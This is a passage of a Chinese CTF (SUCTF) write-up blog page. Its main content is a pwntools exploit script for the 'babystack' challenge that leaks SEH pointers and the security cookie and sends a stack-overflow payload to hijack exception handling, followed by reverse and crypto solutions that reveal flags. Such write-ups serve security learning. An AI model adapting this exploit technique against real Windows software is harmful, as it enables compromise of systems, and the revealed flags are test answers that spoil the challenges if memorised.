class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(stack - <span class="number">0x30</span>))</span><br><span class="line">seh_next = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"seh_next: "</span> + hex(seh_next)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(stack - <span class="number">0x2c</span>))</span><br><span class="line">seh_handle = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"seh_handle: "</span> + hex(seh_handle)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(main - <span class="number">0x395e</span> + <span class="number">0x7c004</span>))</span><br><span class="line">security_cookie = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"security_cookie: "</span> + hex(security_cookie)</span><br><span class="line"></span><br><span class="line">fake_scope_table = security_cookie ^ (stack - <span class="number">0x7c</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"fake_scope_table: "</span> + hex(fake_scope_table)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(stack - <span class="number">0x3c</span>))</span><br><span class="line">check = int(r.recvline().split(<span class="string">"0x"</span>)[<span class="number">2</span>], <span class="number">16</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">"check: "</span> + hex(check)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"go"</span>)</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">0x50</span></span><br><span class="line">payload += <span class="string">"\xe4\xff\xff\xff"</span> + p32(<span class="number">0</span>) + <span class="string">"\x0c\xff\xff\xff"</span> + p32(<span class="number">0</span>)</span><br><span class="line">payload += <span class="string">"\xfe\xff\xff\xff"</span> + p32(main - <span class="number">0x395e</span> + <span class="number">0x8224</span>) + p32(main - <span class="number">0x395e</span> + <span class="number">0x8266</span>)</span><br><span class="line">payload += <span class="string">"a"</span> * <span class="number">0x24</span></span><br><span class="line">payload += p32(check) + <span class="string">"a"</span> * <span class="number">8</span> + p32(seh_next) + p32(seh_handle) + p32(fake_scope_table) + p32(<span class="number">0</span>) + p32(stack)</span><br><span class="line"><span class="comment">#这里注意要修改ebp,触发正确的异常处理函数</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">"yes"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><p>加密过程为<code>RSA</code>,解密即可.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">d = <span class="number">91646299298871237857836940212608056141193465208586711901499120163393577626813</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br></pre></td></tr></table></figure>
+<p>输入<code>v8</code>.<code>sub_96A</code>实际就是将<code>hex</code>转<code>ASCII</code>.</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sub_96A(&amp;v8, (__int64)&amp;v9);</span><br><span class="line"><span class="comment">//v9 = 0x73756374667b50776e5f405f68756e647265645f79656172737d;</span></span><br><span class="line"><span class="comment">//suctf&#123;Pwn_@_hundred_years&#125;</span></span><br><span class="line"><span class="comment">//byte_202010: 30h, 31h, 32h, 33h, 34h, 35h, 36h, 37h, 38h, 39h, 61h, ...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> __<span class="function">fastcall <span class="title">sub_96A</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a2 + i) = byte_202010[(<span class="keyword">char</span>)(a1[v3] &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="number">1L</span>L) = byte_202010[a1[v3++] &amp; <span class="number">0xF</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="MT"><a href="#MT" class="headerlink" title="MT"></a>MT</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> number</span><br><span class="line"><span class="comment">#from flag import flag</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">9</span> &amp; <span class="number">2029229568</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">2245263360</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">revert</span><span class="params">(m)</span>:</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">19</span></span><br><span class="line">    m = m ^ m &lt;&lt; <span class="number">17</span> &amp; <span class="number">0b10000101110101000000000000000000</span></span><br><span class="line">    m = m ^ m &lt;&lt;  <span class="number">9</span> &amp; <span class="number">0b00000000000000111001011000000000</span></span><br><span class="line">    m = m ^ m &lt;&lt;  <span class="number">9</span> &amp; <span class="number">0b00000000111100000000000000000000</span></span><br><span class="line">    m = m ^ m &lt;&lt;  <span class="number">9</span> &amp; <span class="number">0b01111000000000000000000000000000</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span> &amp; <span class="number">0b00000000000001111111111111000000</span></span><br><span class="line">    m = m ^ m &gt;&gt; <span class="number">13</span> &amp; <span class="number">0b00000000000000000000000000111111</span></span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = convert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">detranform</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(message) % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">    new_message = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(message) / <span class="number">4</span>):</span><br><span class="line">        block = message[i * <span class="number">4</span> : i * <span class="number">4</span> +<span class="number">4</span>]</span><br><span class="line">        block = number.bytes_to_long(block)</span><br><span class="line">        block = revert(block)</span><br><span class="line">        block = number.long_to_bytes(block, <span class="number">4</span>)</span><br><span class="line">        new_message += block</span><br><span class="line">    <span class="keyword">return</span> new_message</span><br><span class="line"></span><br><span class="line">transformed_flag = <span class="string">"641460a9e3953b1aaa21f3a2"</span></span><br><span class="line">flag = detranform(transformed_flag.decode(<span class="string">'hex'</span>)).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag&#123;'</span> + flag + <span class="string">'&#125;'</span></span><br><span class="line"><span class="comment">#flag&#123;84b45f89af22ce7e67275bdc&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>附件打开后,很显然是<code>base64</code>加密文件,由于一般字符串加密不会出现<code>+/</code>符号,所以猜测是图片加密,对比一个以往的图片转<code>base64</code>的题目,发现本题与那题开头字符串一致,所以猜测是<code>jpg</code>加密,在开头补上<code>data:imge/jpg;bae64,</code>,然后在线解密一下就得到原有图片了.原图即是<code>flag</code>.</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+       
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Jeopardy/" rel="tag"><i class="fa fa-tag"></i> Jeopardy</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/f3617fb7/" rel="next" title="CS-algorithm-union-find">
+                <i class="fa fa-chevron-left"></i> CS-algorithm-union-find
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/a92ea0b6/" rel="prev" title="web安全-PHP-弱类型">
+                web安全-PHP-弱类型 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/apple-touch-icon.png" alt="w4rd3n">
+            
+              <p class="site-author-name" itemprop="name">w4rd3n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">181</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">50</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/hitworld" title="GitHub &rarr; https://github.com/hitworld" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#playfmt"><span class="nav-number">1.1.</span> <span class="nav-text">playfmt</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二手破电脑"><span class="nav-number">1.2.</span> <span class="nav-text">二手破电脑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#babystack"><span class="nav-number">1.3.</span> <span class="nav-text">babystack</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Signin"><span class="nav-number">2.1.</span> <span class="nav-text">Signin</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto"><span class="nav-number">3.</span> <span class="nav-text">crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MT"><span class="nav-number">3.1.</span> <span class="nav-text">MT</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">4.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#签到题"><span class="nav-number">4.1.</span> <span class="nav-text">签到题</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-gg-circle"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w4rd3n</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="站点总字数">677k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+    <span title="站点阅读时长">10:15</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="总访客量">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="总访问量">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.5.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.5.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.5.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script>
+    
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
+        .done(function ({ results }) {
+          if (results.length > 0) {
+            var counter = results[0];
+            
